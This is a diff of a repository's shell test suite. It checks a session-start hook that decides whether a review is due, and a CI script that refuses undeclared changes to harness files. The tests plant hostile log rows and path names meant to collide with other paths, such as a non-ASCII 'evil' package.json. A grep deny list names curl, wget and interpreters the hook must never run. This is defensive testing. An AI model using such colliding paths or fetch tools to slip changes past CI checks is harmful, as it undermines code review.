-printf '%s\n' "$out" | grep -qi "is due" && fail "dream_due.sh counted merges from a commit main does not contain: $out"
-git -C "$r" reset -q --hard "$keep"
-git -C "$r" branch -qD unmerged # its log holds main's rows, which a branch main has not got would keep covering in the cases below
-printf 'note\n' >"$r/note.md" && git -C "$r" add note.md && git -C "$r" commit -qm "a plain commit after the last merge" && recorded "$(git -C "$r" rev-parse HEAD)"
-ask
-[ -z "$out" ] || fail "dream_due.sh said a dream is due though the plain commit after main's last merge has its dream: $out"
-git -C "$r" reset -q --hard "$keep"
-recorded "$m1"
-ask
-[ -z "$out" ] || fail "dream_due.sh read the older dream's row, listed last, as the newest: $out"
-git -C "$r" reset -q --hard "$keep"
-# An older row is read as hostile as the last (round 1, reviewer-1-4): a word git reads as a name (main, HEAD), a commit main does not contain,
-# and a row past the last twenty each cover nothing; here the merge of m2 stays uncovered beside a valid last row naming m1.
-log_with() { # rows (hostile or older) first, then the valid last row for m1
-	printf '| Date | Review |\n|---|---|\n' >"$r/docs/review-log.md"
-	for w in "$@"; do printf '| 2026-11-05 | The dream of %s (older) | x |\n' "$w" >>"$r/docs/review-log.md"; done
-	recorded "$m1"
-}
-for older in main HEAD "$(git -C "$r" rev-parse --short=8 "$um")"; do
-	log_with "$older"
-	ask
-	printf '%s\n' "$out" | grep -qi "is due" || fail "dream_due.sh let the older row '$older' cover merges it does not name: $out"
-	git -C "$r" reset -q --hard "$keep"
-done
-many=
-for _ in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20; do many="$many $(git -C "$r" rev-parse --short=8 "$m1")"; done
-# shellcheck disable=SC2086 # the shas, one word each
-log_with "$(git -C "$r" rev-parse --short=8 "$m2")" $many
-ask
-printf '%s\n' "$out" | grep -qi "is due" || fail "dream_due.sh read a row past the last twenty, which a newer dream has overtaken: $out"
-git -C "$r" reset -q --hard "$keep"
-git -C "$r" branch -m main trunk
-ask
-printf '%s\n' "$out" | grep -qi "could not tell" || fail "dream_due.sh did not say it could not tell with no main: $out"
-git -C "$r" branch -m trunk main
-r2="$t/dream2" && mkdir -p "$r2" && git -C "$r2" init -q && git -C "$r2" checkout -q -b main && printf 'x\n' >"$r2/a" && git -C "$r2" add a && git -C "$r2" commit -qm base
-ask "$r2"
-printf '%s\n' "$out" | grep -qi "could not tell" || fail "dream_due.sh did not say it could not tell with no docs/review-log.md on main: $out"
-mkdir -p "$t/norepo"
-ask "$t/norepo"
-printf '%s\n' "$out" | grep -qi "could not tell" || fail "dream_due.sh did not say it could not tell outside a repository: $out"
-# A dream's row lands on the next slice's branch and reaches main only with the next merge, itself past the sha, so main alone said a dream was
-# due in every session (F4063): a committed row of a branch main has not got counts, when main contains its sha, and covers no later merge.
-merge_slice three
-m3=$(git -C "$r" rev-parse HEAD)
-git -C "$r" checkout -q -b eight && recorded "$m3" && git -C "$r" checkout -q main
-ask
-[ -z "$out" ] || fail "dream_due.sh said a dream is due though a branch main has not got holds the row of main's last merge (F4063): $out"
-merge_slice four
-ask
-printf '%s\n' "$out" | grep -qi "is due" || fail "dream_due.sh let a branch's row cover a merge after its sha: $out"
-# Such a row is read as hostile as main's own: a word git reads as a name, and a commit main does not contain, cover nothing.
-git -C "$r" checkout -q -b nine
-printf '| 2026-11-06 | The dream of main (hostile) | x |\n| 2026-11-06 | The dream of %s (never merged) | x |\n' "$(git -C "$r" rev-parse --short=8 "$um")" >>"$r/docs/review-log.md"
-git -C "$r" commit -qam "hostile rows on a branch" && git -C "$r" checkout -q main
-ask
-printf '%s\n' "$out" | grep -qi "is due" || fail "dream_due.sh let a hostile row of a branch cover main's merges: $out"
-# Branches it cannot list: it could not tell.
-mkdir -p "$t/dreambin"
-printf '#!/bin/sh\nfor a in "$@"; do [ "$a" = for-each-ref ] && exit 1; done\nexec "%s" "$@"\n' "$(command -v git)" >"$t/dreambin/git"
-chmod +x "$t/dreambin/git"
-out=$(PATH="$t/dreambin:$PATH" CLAUDE_PROJECT_DIR="$r" sh "$dds" </dev/null 2>&1)
-printf '%s\n' "$out" | grep -qi "could not tell" || fail "dream_due.sh did not say it could not tell with branches it cannot list: $out"
-# A session writes branches, and this hook starts every session, so what a branch holds bounds its time (round 1 of its review, a 256 MiB log held
-# one for minutes, 1,000 branches 265 s): a log past 4 MB is not read, and only the 20 newest branches are, by date, never by name.
-git -C "$r" branch -qD eight nine
-m4=$(git -C "$r" rev-parse HEAD)
-git -C "$r" checkout -q -b big
-{ head -c 4194400 /dev/zero | tr '\0' x | fold -w 1000; echo; printf '| 2026-11-07 | The dream of %s (past the cap) | x |\n' "$(git -C "$r" rev-parse --short=8 "$m4")"; } >>"$r/docs/review-log.md"
-git -C "$r" commit -qam "a log past the cap" && git -C "$r" checkout -q main
-ask
-printf '%s\n' "$out" | grep -qi "is due" || fail "dream_due.sh read a log past 4 MB, which a session could make hold it for minutes: $out"
-git -C "$r" branch -qD big
-stamped() { # $1: a date, $2: a message; a commit of main's tree on a branch of its own, checked out
-	GIT_COMMITTER_DATE="$1" git -C "$r" commit -q --allow-empty -m "$2"
-}
-git -C "$r" checkout -q -b old-stamp && stamped 2001-01-01T00:00:00Z "older than every branch below"
-for n in 01 02 03 04 05 06 07 08 09 10 11 12 13 14 15 16 17 18 19 20; do git -C "$r" branch "a$n"; done
-git -C "$r" checkout -q main && git -C "$r" checkout -q -b zz-row && recorded "$m4" && git -C "$r" checkout -q main
-ask
-[ -z "$out" ] || fail "dream_due.sh read branches by name, not the newest by date: $out"
-git -C "$r" checkout -q -b new-stamp && stamped 2031-01-01T00:00:00Z "newer than the row's branch"
-for n in 01 02 03 04 05 06 07 08 09 10 11 12 13 14 15 16 17 18 19 20; do git -C "$r" branch "b$n"; done
-git -C "$r" checkout -q main
-ask
-printf '%s\n' "$out" | grep -qi "is due" || fail "dream_due.sh read past the 20 newest branches, so a session's branches could hold it for minutes: $out"
-# What it may run: git read-only and text tools, nothing of the repository, no gate.
-body=$(grep -v '^[[:space:]]*#' "$dds")
-printf '%s\n' "$body" | grep -qE '(^|[^a-z_.-])(check\.sh|node|pnpm|npm|npx|python3?|ruby|perl|make|curl|wget)([^a-z_-]|$)' && fail "dream_due.sh runs a tool that is neither git nor a text tool"
-printf '%s\n' "$body" | grep -qE 'git +(-C +[^ ]+ +)?(add|commit|checkout|switch|restore|reset|stash|merge|rebase|fetch|pull|push|config|update-ref|gc|worktree|tag|clean|rm|mv)([^a-z-]|$)' && fail "dream_due.sh runs a git command that writes"
-printf '%s\n' "$body" | grep -qE '(^|[;&| ])(\.|source) ' && fail "dream_due.sh sources a file of the repository"
 fi
 
 if part deploy_stop; then
@@ -8388,7 +7431,10 @@ git archive "$base" scripts docs/REVIEW.md .githooks | (mkdir -p "$c/base" && ta
 changes() { (cd "$c/repo" && sh "$c/base/scripts/ci_changes.sh" "$@") >"$c/out" 2>"$c/err"; }
 judge() { changes "$@" || fail "ci_changes.sh failed on $*: $(cat "$c/err")"; [ -z "$(cd "$c/repo" && git status --porcelain)" ] || fail "ci_changes.sh wrote in the checkout"; }
 is() { grep -qx "$1" "$c/out" || fail "ci_changes.sh: $2: no $1 in $(tr '\n' ' ' <"$c/out") $(cat "$c/err")"; }
-change() { (cd "$c/repo" && git checkout -qf "$base" && git checkout -qf -B change && eval "$1" && git add -A && git commit -qm change); }
+# change: a commit of the change, every path declared (D13173); undeclared: the same, declaring none.
+change() { (cd "$c/repo" && git checkout -qf "$base" && git checkout -qf -B change && eval "$1" && git add -A &&
+	git commit -qm change -m "$(git -c core.quotePath=false diff --cached --name-only | sed 's/^/Harness-changed: /; s/$/ - a test/')"); }
+undeclared() { (cd "$c/repo" && git checkout -qf "$base" && git checkout -qf -B change && eval "$1" && git add -A && git commit -qm change); }
 flags="product ts app gno deploy ui nginx migrations harness tier1"
 change 'printf "y\n" >docs/x.md'
 judge pull_request "$base" "$c/base"
@@ -8423,13 +7469,46 @@ for event in workflow_dispatch pull_request_target; do
 done
 # What the base lacks, or a script of it that fails, calls for the job (F113, F116, F125).
 mv "$c/base/.githooks/records.sh" "$c/records.sh"
-judge pull_request "$base" "$c/base" && is harness=true "a base with no harness list"
+changes pull_request "$base" "$c/base" && fail "ci_changes.sh passed a change it could not read the base's harness list for"
+grep -q "harness list" "$c/err" || fail "ci_changes.sh refused a base with no harness list without saying so: $(cat "$c/err")"
+printf 'harness() ( exit 3 )\nforeign() ( exit 1 )\n' >"$c/base/.githooks/records.sh"
+changes pull_request "$base" "$c/base" && fail "ci_changes.sh passed a change whose base's harness list fails"
+grep -q "harness list" "$c/err" || fail "ci_changes.sh refused a base whose harness list fails without saying so: $(cat "$c/err")"
+rm "$c/base/.githooks/records.sh"
 mv "$c/records.sh" "$c/base/.githooks/records.sh" && mv "$c/base/scripts/speeds.py" "$c/speeds.py"
 judge pull_request "$base" "$c/base" && is tier1=true "a base with no speeds.py"
 mv "$c/speeds.py" "$c/base/scripts/speeds.py" && mv "$c/base/docs/REVIEW.md" "$c/REVIEW.md"
 judge pull_request "$base" "$c/base" && is tier1=true "a base with no tier table"
 mv "$c/REVIEW.md" "$c/base/docs/REVIEW.md"
 changes pull_request 0000000000000000000000000000000000000000 "$c/base" && fail "ci_changes.sh judged a change against a base git does not have"
+grep -q "no commit 0000000000000000000000000000000000000000" "$c/err" || fail "ci_changes.sh refused a base git does not have for another reason: $(cat "$c/err")"
+# What reaches main by GitHub's merge met no hook of a clone (D13173, the security review of 3b). A harness file no commit declares,
+# or declares with no reason, is refused, named, on a pull request and on a push; declared, it passes. A path outside the list needs
+# no line; a manual run judges no declaration (every job runs).
+undeclared 'printf "y\n" >scripts/new.py'
+changes pull_request "$base" "$c/base" && fail "ci_changes.sh passed a harness file no commit declares (F089)"
+grep -qF "scripts/new.py" "$c/err" || fail "ci_changes.sh did not name the undeclared harness file: $(cat "$c/err")"
+changes push "$base" "$c/base" && fail "ci_changes.sh passed on a push a harness file no commit declares (F089)"
+(cd "$c/repo" && git commit -q --allow-empty -m declare -m "Harness-changed: scripts/new.py")
+changes pull_request "$base" "$c/base" && fail "ci_changes.sh took a declaration with no reason"
+(cd "$c/repo" && git commit -q --allow-empty -m declare -m "Harness-changed: scripts/new.py - a test")
+judge pull_request "$base" "$c/base" && is harness=true "a declared harness file"
+undeclared 'printf "y\n" >app/src/c.ts && printf "y\n" >docs/z.md'
+judge pull_request "$base" "$c/base"
+undeclared 'printf "y\n" >scripts/other.py'
+judge workflow_dispatch "$base" "$c/base"
+# A path this disk may read as another, a byte outside ASCII (F164) or a name equal but for case to another (F151), written to the
+# index as it is (this disk folds the names it writes), is refused whatever the event, declared or not.
+for name in "$(printf 'packages\305\277/evil/package.json')" Server/src/evil.ts SCRIPTS/x.py; do
+	printf 'y\n' >"$c/blob"
+	(cd "$c/repo" && git checkout -qf "$base" && git checkout -qf -B change &&
+		git update-index --add --cacheinfo "100644,$(git hash-object -w "$c/blob"),$name" && git commit -qm change -m "Harness-changed: $name - a test")
+	[ -n "$(cd "$c/repo" && git -c core.quotePath=false ls-tree -r --name-only HEAD | grep -xF "$name")" ] || fail "the case of $name planted nothing"
+	for event in pull_request workflow_dispatch; do
+		changes "$event" "$base" "$c/base" && fail "ci_changes.sh passed $name, which this disk may read as another path (F151, F164), on $event"
+		grep -q "this disk may read as another" "$c/err" || fail "ci_changes.sh refused $name for another reason: $(cat "$c/err")"
+	done
+done
 cd "$here/.."
 # The verdict: every job passed, or was skipped because the change did not call for it, by a table written apart from REQUIRED.
 python3 -I - "$here" <<'PY' || fail "ci_gate_ok.py lets a gate pass that must fail, or the reverse"
